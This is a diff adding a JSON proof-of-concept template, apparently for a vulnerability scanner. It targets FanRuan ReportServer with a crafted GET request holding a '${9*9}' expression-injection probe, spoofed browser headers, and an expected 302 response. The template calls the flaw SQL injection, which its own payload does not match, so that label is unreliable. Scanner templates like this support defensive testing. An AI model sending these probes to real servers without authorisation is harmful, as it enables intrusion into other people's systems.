@@ -1,0 +1,20 @@
+{
+	"name":"帆软系统ReportServerSQL注入",
+	"tag":"fanruan",
+	"type":"other",
+	"poc":{
+		"pocGet":"/webroot/decision/view/ReportServer?test=&n=${9*9}",
+		"header":{
+			"Cookie":" tenantId=default",
+			"Accept":" application/json, text/javascript, */*; q=0.01",
+			"X-Requested-With":" XMLHttpRequest",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Connection":" close",
+			"Referer":"{{url}}/webroot/decision/login?origin=1dc5fbd4-27eb-41b5-a43f-0623003685b4",
+			"Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Accept-Encoding":" gzip, deflate"
+		},
+		"status_code":"302",
+		"pattern":"()"
+	}
+}
